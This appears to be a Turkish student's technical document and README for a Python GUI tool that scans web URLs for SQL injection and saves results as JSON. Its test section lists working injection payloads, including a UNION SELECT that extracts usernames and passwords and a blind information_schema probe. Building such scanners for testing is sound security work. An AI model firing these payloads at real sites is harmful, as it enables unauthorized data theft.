## Teknik Doküman

## Temel Bilgiler
- Proje Adı: SQL Injection Tarama Aracı
- Öğrenci Adı ve Numarası: Ferhat AKDEMİR, 2320191084
- Teslim Tarihi: 31.01.2025

## Proje Tanımı
- Projenin amacı, SQL Injection güvenlik açığını tespit eden bir araç geliştirmektir. Bu araç, web uygulamalarındaki SQL Injection açıklarını test ederek potansiyel zafiyetleri belirler.

- Çözülen güvenlik problemi: SQL Injection saldırıları
- Hedef kitle ve kullanım alanları: Web geliştiricileri, güvenlik uzmanları, test mühendisleri

# SQL Injection Scanner

Bu proje, web uygulamalarındaki SQL Injection güvenlik açıklarını test etmek için bir araçtır. Araç, temel ve ileri seviye testler yaparak kullanıcıya sonuçları JSON formatında ve GUI üzerinde sunar.

## Özellikler

- SQL Injection payload'larını kullanarak hedef URL'yi test eder.
- Güvenlik açığı tespiti yapılır ve sonuçlar "vulnerable" (açık) veya "safe" (güvenli) olarak sınıflandırılır.
- Test sonuçları GUI üzerinde görüntülenir.
- Sonuçlar JSON formatında kaydedilir ve dosya adı zaman damgasıyla otomatik olarak oluşturulur.
- Kullanıcı dostu bir arayüz ile işlemler kolayca yapılabilir.
- Test seviyeleri: Temel (basic) ve İleri (advanced).

## Kullanım

1. Python 3.x ve gerekli kütüphaneleri yükleyin:
   - `requests`
   - `tkinter`

2. Proje dosyalarını indirin veya klonlayın:
   ```bash
   git clone https://github.com/Scofield1881/sql-injection-scanner.git
   ```

3. Gereksinimleri yükleyin:
   ```bash
   pip install requests
   ```

4. Projeyi çalıştırmak için aşağıdaki komutu kullanın:
   ```bash
   python main.py
   ```

5. GUI arayüzü açılacaktır. Hedef URL'yi girin, test seviyesini seçin ve "Test Başlat" butonuna tıklayın.

6. Test sonuçları GUI'de görüntülenir ve sonuçlar bir JSON dosyasına kaydedilir.

## Gereksinimler

- Python 3.x
- `requests` modülü (HTTP istekleri göndermek için)
- Tkinter modülü (GUI için)

## Testler

Araç, aşağıdaki SQL Injection payload'larını test eder:

**Temel Payload'lar:**
- `' OR 1=1 --`
- `' UNION SELECT NULL, NULL --`
- `1' OR '1'='1`

**İleri Seviye Payload'lar:**
- `' AND 1=2 UNION SELECT NULL, version() --`
- `' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64 --`
- `' UNION ALL SELECT NULL, NULL, NULL --`
- `' UNION SELECT username, password FROM users --`

## Sonuçlar

Test sonuçları aşağıdaki formatta kaydedilir:

```json
{
    "results": [
        {
            "payload": "' OR 1=1 --",
            "status": "safe",
            "url": "http://example.com/?input=' OR 1=1 --",
            "status_code": 200,
            "response_snippet": "<html>...</html>"
        },
        {
            "payload": "1' OR '1'='1",
            "status": "vulnerable",
            "url": "http://example.com/?input=1' OR '1'='1",
            "status_code": 500,
            "response_snippet": "<html>...</html>"
        }
    ]
}
```

## Katkı

Bu projeye katkıda bulunmak isterseniz, lütfen pull request gönderin veya önerilerinizi issues üzerinden paylaşın.

## Lisans

Bu proje MIT Lisansı ile lisanslanmıştır.
